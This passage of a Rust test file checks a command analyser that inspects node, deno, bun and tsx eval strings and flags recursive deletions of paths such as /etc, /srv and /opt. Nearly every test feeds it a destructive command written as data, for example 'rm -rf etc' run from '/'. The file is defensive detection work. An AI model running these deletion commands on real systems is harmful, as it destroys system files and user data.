            "require('child_process').spawnSync('rm -rf etc', {shell: true, cwd: '/tmp/..'})",
        ][..],
        &[
            "deno",
            "eval",
            "new Deno.Command('rm', {args: ['-rf', 'etc'], cwd: '/'}).outputSync()",
        ][..],
        &[
            "bun",
            "-e",
            "Bun.spawnSync(['rm', '-rf', 'etc'], {cwd: '/'})",
        ][..],
        &[
            "bun",
            "-e",
            "Bun.spawn({cmd: ['rm', '-rf', 'etc'], cwd: '/'})",
        ][..],
    ] {
        let plan = exec(argv);
        assert!(recursive_delete(&plan, "/etc"), "{argv:?}: {plan:?}");
        assert!(!recursive_delete(&plan, "/app/etc"), "{argv:?}: {plan:?}");
    }
    // A relative cwd resolves against the program's cwd.
    let plan = exec(&[
        "node",
        "-e",
        "require('child_process').spawn('rm', ['-rf', 'etc'], {cwd: 'sub'})",
    ]);
    assert!(recursive_delete(&plan, "/app/sub/etc"), "{plan:?}");
    // An options cwd that is not a literal path leaves the child unplaced; a
    // callback in the options slot names no cwd.
    for argv in [
        &[
            "node",
            "-e",
            "require('child_process').spawn('rm', ['-rf', 'etc'], {cwd: process.argv[2]})",
        ][..],
        &[
            "deno",
            "eval",
            "new Deno.Command('rm', {args: ['-rf', 'etc'], cwd: Deno.args[0]}).outputSync()",
        ][..],
    ] {
        let plan = exec(argv);
        assert!(
            !ops(&plan).contains(&"filesystem.delete"),
            "{argv:?}: {plan:?}"
        );
        assert!(!all_full(&plan), "{argv:?}");
    }
    let plan = exec(&[
        "node",
        "-e",
        "require('child_process').exec('rm -rf etc', () => {})",
    ]);
    assert!(recursive_delete(&plan, "/app/etc"), "{plan:?}");
}

#[test]
fn bun_eval_runs_node_modules_and_bun_runtime_apis() {
    let plan = exec(&[
        "bun",
        "-e",
        "require('fs').rmSync('/etc', {recursive: true})",
    ]);
    assert!(recursive_delete(&plan, "/etc"), "{plan:?}");
    assert!(ops(&plan).contains(&"process.code_execution"));
    assert!(all_full(&plan), "{plan:?}");
    let plan = exec(&["bun", "--eval", "Bun.spawnSync(['rm', '-rf', '/srv'])"]);
    assert!(recursive_delete(&plan, "/srv"), "{plan:?}");
    let plan = exec(&["bun", "-e", "Bun.spawn({cmd: ['rm', '-rf', '/opt']})"]);
    assert!(recursive_delete(&plan, "/opt"), "{plan:?}");
    let plan = exec(&[
        "bun",
        "-e",
        "await Bun.write('/srv/a', 'x'); await Bun.file('/srv/b').delete(); const s: string = await Bun.file('/srv/c').text();",
    ]);
    assert!(has(&plan, "filesystem.write", "/srv/a"));
    assert!(has(&plan, "filesystem.delete", "/srv/b"));
    assert!(!has(&plan, "filesystem.delete", "/srv/c"));
    assert!(has_boundary(&plan, "unresolved_call"));
    // Bun's globals belong to Bun alone.
    let plan = exec(&["deno", "eval", "Bun.spawnSync(['rm', '-rf', '/srv'])"]);
    assert!(!ops(&plan).contains(&"filesystem.delete"), "{plan:?}");
}

#[test]
fn tsx_eval_runs_typescript() {
    let plan = exec(&[
        "tsx",
        "-e",
        "const p: string = '/etc'; require('fs').rmSync(p, {recursive: true})",
    ]);
    assert!(recursive_delete(&plan, "/etc"), "{plan:?}");
    assert!(!has_boundary(&plan, "parse_error"));
    let plan = exec(&[
        "tsx",
        "--tsconfig",
        "tsconfig.json",
        "-e",
        "import { execSync } from 'child_process'; execSync('rm -rf /srv')",
    ]);
    assert!(recursive_delete(&plan, "/srv"), "{plan:?}");
}
